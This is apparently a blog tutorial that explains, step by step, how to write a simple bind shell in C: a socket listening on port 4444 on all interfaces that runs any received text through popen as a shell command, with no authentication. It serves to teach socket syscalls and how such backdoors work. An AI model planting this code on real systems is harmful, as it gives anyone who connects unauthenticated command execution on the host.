# Bind Shell

Okay, so I wrote a small bind shell over the weekend. It's not perfect, but it's good to illustrate a few things.
It can be found at [bind_shell.c](https://github.com/erroronsecurity/misc/bind_shell.c).

Obviously, we start with importing a few libraries:
```
#include <stdio.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
...
```

The first set handles calls like sizeof, printf, popen, and memset.
The second set is our networking libraries. They provide syscalls and helpers.

So let's talk about syscalls. Setting up a server to listen to the network usually entails a few of them, in a specific order:
* socket()
* bind()
* listen()
* accept()
* recv()
* send()

We'll walk through them as we build our program.

Inside the main function, we start with:
```
int listen_socket_fd = socket(AF_INET, SOCK_STREAM, 0);
...
```

Calling socket(), it takes 3 arguments, all integer types:
* domain
* type
* protocol

The domain is really the addressing protocol, in our case, AF_INET, specifying IPv4.
The type is the transport protocol, in our case, SOCK_STREAM, which specifies TCP.
Then there's the 'protocol'. This is almost always 0, again specifying TCP but acting as a placeholder in the case of various TCP implementations.

Now, we build a sockaddr_in structure.
This is a namespace that "names" the socket. It's where we get to specify address and port:
```
struct sockaddr_in address;
address.sin_family = AF_INET;
address.sin_addr.s_addr = 0;
address.sin_port = htons(4444);
...
```

There's kindof a lot going on in just those three lines, so let's break it down.

`struct sockaddr_in address;` instantiates the struct, of type sockaddr_in, a modified version of a sockaddr but for inet purposes.
`address.sin_family = AF_INET;` once again specifies IPv4.
`address.sin_addr.s_addr = 0;` is specifying an address to bind to, in the form of a 32-bit integer. Specifying 0 here is the same as INADDR_ANY, telling it to bind to anything.
You can also use `inet_addr()` here to convert from numbers and dots notation to an integer.
`address.sin_port = htons(4444);` finally specifies we want to bind to port 4444, 4444 being an integer and htons converting it from host byte order to network byte order and making it a short int.


Now, we store address_size for later. It's easier to reference this way:
```
int address_size = sizeof(address);
...
```

Then we bind and listen:
```
bind(listen_socket_fd, (struct sockaddr *) &address, address_size);
listen(listen_socket_fd, 3);
...
```

`bind()` looks for 3 arguments, the socket itself, the address of the sockaddr struct we built, and the size of the struct. This actually connects the socket to the port and such.
Then, we listen, which asks for the socket and the number of connections to keep in the backlog, 3 being a good default.


Finally:
```
while(1) {
    puts("Listening...");

    int accept_socket_fd = accept(listen_socket_fd, (struct sockaddr *) &address, &address_size);
    ...
```

We loop infinitely, accepting connections on the listening_socket file descriptor, which creates a new one to work with, accept_socket_fd.


Then we loop infinitely again:
```
while(1) {
    char buffer[1024];
    recv(accept_socket_fd, buffer, 1024, 0);
    printf("Running command: %s", buffer);

    popen(buffer, "r");
    memset(buffer, 0, 1024);
}
...
```

This creates a buffer for recv-ing into, then we recv, which expects the socket, the buffer to write to, max number of bytes to write barring discovery of a null byte (\0), and 0 for flags (ignore this).

Once the buffer is written to, we pass it to popen to run our command, then memset to clear the buffer.


Congrats, you have a simple bind shell!
